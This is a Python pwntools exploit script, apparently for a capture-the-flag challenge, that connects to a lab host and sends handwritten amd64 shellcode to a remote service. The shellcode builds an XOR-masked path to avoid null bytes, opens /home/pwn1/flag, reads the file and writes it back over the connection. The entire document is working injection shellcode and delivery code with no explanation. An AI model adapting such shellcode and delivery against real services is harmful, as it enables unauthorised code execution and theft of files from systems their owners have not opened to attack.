#!/usr/bin/env python
# Wildfoot
from pwn import *

context.update(arch="amd64", os="linux")

host = "10.13.2.43"
port = 10739
r = remote(host, port)
#r = process("./pwn1")

input("attach in gdb and press Enter")

#payload = flat([])

payload = asm("""
/*
_start:
    jmp push_str
*/

open:
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x67616c662f316e
    xor [rsp], rax 
    mov rax, 0x77702f656d6f682f
    push rax 
    /*
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x67616c662f316e77
    xor [rsp], rax 
    mov rax, 0x702f656d6f682f2f
    push rax 
    */
    mov rdi, rsp
    xor rsi, rsi
    /* xor rdx, rdx */
    cdq
    /* mov rax, 0x02 */
    xor rax, rax
    add al, 0x02
    syscall

read:
    /* mov rdi, rax */
    /* mov rdi, 0x3 */
    xor rdi, rdi
    mov dil, 0x3
    mov rsi, rsp
    /* mov rdx, 0x29 */
    push 0x29
    pop rdx
    /* xor rdx, rdx
    mov dx, 0xfff */
    xor rax, rax
    syscall

write:
    /* mov rdi, 1 */
    xor rdi, rdi
    add dil, 0x01
    mov rsi, rsp
    mov rdx, rax
    /* mov rax, 0x01 */
    /* xor rax, rax
    add al, 0x01 */
    mov al, 0x01
    syscall
    jmp read
    

/*
push_str:
    call open
    path: db "/home/pwn1/flag"
*/

    /*
    xor rdi, rdi
    mov rax, 0x3c
    syscall
    */
""")

print("payload length : ", len(payload))
print(payload)
r.recvuntil("):")
r.sendline(payload)

r.interactive()
